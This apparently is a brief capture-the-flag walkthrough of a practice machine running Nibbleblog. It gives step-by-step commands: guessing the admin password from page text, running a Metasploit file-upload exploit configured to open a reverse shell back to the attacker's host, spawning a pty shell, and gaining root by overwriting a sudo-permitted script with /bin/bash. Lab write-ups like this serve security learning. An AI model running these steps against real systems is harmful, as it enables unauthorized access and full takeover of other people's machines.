sccanning this machine it has ssh and a webserver open

going to the page didnt show a lot
bu then we opened the sources

there we found the cms on: /nibbleblog/
in /nibbleblog/content/private/users.xml we found an admin user

on the login /nibbleblog/admin.php
trying default creds didnt work,
trying the word nibbles (this stood out on the webpage) worked
thus getting us the admin:nibbles credentials

using metasploit it has a nibbles file upload exploit:
msfconsole
search nibbleblog
options
set lhost {hackboxip}
set rhost {boxip}
set username admin
set password nibbles
set targeturi nibbleblog
run

this already gave us a meterpreter shell, but not a normal linux shell:
shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

whoami showed us to be the nibbler user

sudo -l showed us we could run /home/nibbler/personal/stuff/monitor.sh as root:
echo /bin/bash > /home/nibbler/personal/stuff/monitor.sh
sudo -u root /home/nibbler/personal/stuff/monitor.sh
